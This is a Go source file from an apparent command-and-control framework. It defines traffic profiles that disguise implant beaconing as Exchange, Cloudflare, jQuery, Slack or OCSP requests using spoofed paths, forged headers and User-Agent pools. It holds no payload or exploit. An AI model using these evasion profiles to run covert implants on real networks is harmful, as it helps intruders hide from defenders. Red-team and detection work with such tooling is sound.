// Package profiles defines malleable C2 HTTP profiles.
// A profile controls the URI paths, headers, and User-Agent pool used for
// agent ↔ server communication.  Both the agent (at build time) and the server
// (at startup) load the same profile so routes and traffic patterns align.
package profiles

import "strings"

// C2Profile describes one malleable C2 communication profile.
type C2Profile struct {
	Name string

	// URI paths — relative to server root, no trailing slash.
	// CommandPath MUST contain the literal "{agent_id}" which the agent
	// substitutes with its UUID and the server registers as a gin ":id" param.
	// BeaconPath is the combined checkin+result+command endpoint (B1).
	// It replaces separate Checkin + GetNextCommand calls with a single POST per cycle.
	CheckinPath string
	CommandPath string // contains {agent_id}
	ResultPath  string
	BeaconPath  string // contains {agent_id} — combined beacon endpoint

	// ContentType for POST bodies (default "application/json").
	ContentType string

	// Static HTTP headers appended to every request.
	Headers map[string]string

	// Realistic User-Agent pool.  Empty means use the evasion manager's pool.
	UserAgents []string
}

// CommandPathForAgent substitutes {agent_id} with the supplied agent UUID.
func (p *C2Profile) CommandPathForAgent(agentID string) string {
	return strings.ReplaceAll(p.CommandPath, "{agent_id}", agentID)
}

// CommandGinPattern returns the gin route pattern for CommandPath.
// e.g. "/ews/exchange.asmx/{agent_id}" → "/ews/exchange.asmx/:id"
func (p *C2Profile) CommandGinPattern() string {
	return strings.ReplaceAll(p.CommandPath, "{agent_id}", ":id")
}

// BeaconPathForAgent substitutes {agent_id} in BeaconPath with the agent UUID.
func (p *C2Profile) BeaconPathForAgent(agentID string) string {
	return strings.ReplaceAll(p.BeaconPath, "{agent_id}", agentID)
}

// BeaconGinPattern returns the gin route pattern for BeaconPath.
func (p *C2Profile) BeaconGinPattern() string {
	return strings.ReplaceAll(p.BeaconPath, "{agent_id}", ":id")
}

// ── Built-in profiles ─────────────────────────────────────────────────────────

// All returns every built-in profile keyed by Name.
func All() map[string]*C2Profile {
	list := []*C2Profile{
		Default(),
		Office365(),
		CDN(),
		jQuery(),
		Slack(),
		OCSP(),
	}
	m := make(map[string]*C2Profile, len(list))
	for _, p := range list {
		m[p.Name] = p
	}
	return m
}

// Get returns a built-in profile by name, or Default() if unknown.
func Get(name string) *C2Profile {
	if p, ok := All()[name]; ok {
		return p
	}
	return Default()
}

// Default is the original taburtuai API paths — no masquerading.
func Default() *C2Profile {
	return &C2Profile{
		Name:        "default",
		CheckinPath: "/api/v1/checkin",
		CommandPath: "/api/v1/command/{agent_id}/next",
		ResultPath:  "/api/v1/command/result",
		BeaconPath:  "/api/v1/beacon/{agent_id}",
		ContentType: "application/json",
		Headers:     map[string]string{},
		UserAgents: []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		},
	}
}

// Office365 mimics Microsoft Exchange / EWS traffic.
func Office365() *C2Profile {
	return &C2Profile{
		Name:        "office365",
		CheckinPath: "/autodiscover/autodiscover.xml",
		CommandPath: "/ews/exchange.asmx/{agent_id}",
		ResultPath:  "/mapi/emsmdb",
		BeaconPath:  "/ews/calendar.asmx/{agent_id}",
		ContentType: "application/json",
		Headers: map[string]string{
			"X-MS-Exchange-Organization-AuthSource":       "corp.local",
			"X-MS-Exchange-Forest-RulesExecuted":          "true",
			"X-AnchorMailbox":                             "SystemMailbox{1f05a927-b94a-4cd7-a8ef-27af6d6f4488}@corp.local",
			"X-MS-Exchange-Organization-SCL":              "-1",
			"X-MS-Exchange-Transport-EndToEndLatency":     "00:00:01.2345",
			"Prefer":                                      "exchange.behavior.version=2",
		},
		UserAgents: []string{
			"Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17928; Pro)",
			"Microsoft Office/16.0 (Windows NT 10.0; Microsoft Word 16.0.17928; Pro)",
			"Microsoft WinHTTP/5.1",
			"Microsoft Office/16.0 (Windows NT 10.0; Microsoft Excel 16.0.17928; Pro)",
			"Autodiscover/1.0 (Microsoft Office/16.0 (Windows NT 10.0))",
		},
	}
}

// CDN mimics Cloudflare CDN edge traffic.
func CDN() *C2Profile {
	return &C2Profile{
		Name:        "cdn",
		CheckinPath: "/cdn-cgi/rum",
		CommandPath: "/cdn-cgi/challenge-platform/h/b/flow/{agent_id}",
		ResultPath:  "/cdn-cgi/zaraz/t",
		BeaconPath:  "/cdn-cgi/challenge-platform/h/g/orchestrate/{agent_id}",
		ContentType: "application/json",
		Headers: map[string]string{
			"CF-IPCountry":     "US",
			"CF-Visitor":       `{"scheme":"https"}`,
			"X-Forwarded-For":  "1.1.1.1",
			"X-Real-IP":        "1.1.1.1",
			"CDN-Loop":         "cloudflare",
			"X-Forwarded-Proto": "https",
		},
		UserAgents: []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
		},
	}
}

// jQuery mimics static asset / jQuery CDN requests.
func jQuery() *C2Profile {
	return &C2Profile{
		Name:        "jquery",
		CheckinPath: "/assets/js/jquery-3.7.1.min.js",
		CommandPath: "/assets/js/bundle.{agent_id}.min.js",
		ResultPath:  "/assets/js/vendors~main.chunk.js",
		BeaconPath:  "/assets/js/runtime~main.{agent_id}.js",
		ContentType: "application/x-www-form-urlencoded",
		Headers: map[string]string{
			"Referer":         "https://code.jquery.com/",
			"X-Requested-With": "XMLHttpRequest",
			"Origin":          "https://code.jquery.com",
		},
		UserAgents: []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
		},
	}
}

// Slack mimics Slack Web API calls.
func Slack() *C2Profile {
	return &C2Profile{
		Name:        "slack",
		CheckinPath: "/api/users.identity",
		CommandPath: "/api/conversations.history/{agent_id}",
		ResultPath:  "/api/chat.postMessage",
		BeaconPath:  "/api/rtm.connect/{agent_id}",
		ContentType: "application/json; charset=utf-8",
		Headers: map[string]string{
			"Authorization":              "Bearer xoxb-placeholder-token",
			"X-Slack-Retry-Num":          "0",
			"X-Slack-No-Retry":           "1",
			"X-Slack-Request-Timestamp":  "1714924512",
		},
		UserAgents: []string{
			"Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
			"Slack SSB/4.35.126 (Win32 NT 10.0.22621; x64)",
			"Slack/4.35.126 (Windows 10; 64-bit; +https://slack.com)",
		},
	}
}

// OCSP mimics OCSP/CRL certificate validation traffic (very low-noise).
func OCSP() *C2Profile {
	return &C2Profile{
		Name:        "ocsp",
		CheckinPath: "/ocsp",
		CommandPath: "/ocsp/{agent_id}",
		ResultPath:  "/crl/root.crl",
		BeaconPath:  "/crl/{agent_id}.crl",
		ContentType: "application/ocsp-request",
		Headers: map[string]string{
			"Cache-Control": "no-cache",
			"Pragma":        "no-cache",
		},
		UserAgents: []string{
			"Microsoft-CryptoAPI/10.0",
			"Microsoft-WinHTTP/5.1",
			"CertUtil URL Agent",
		},
	}
}
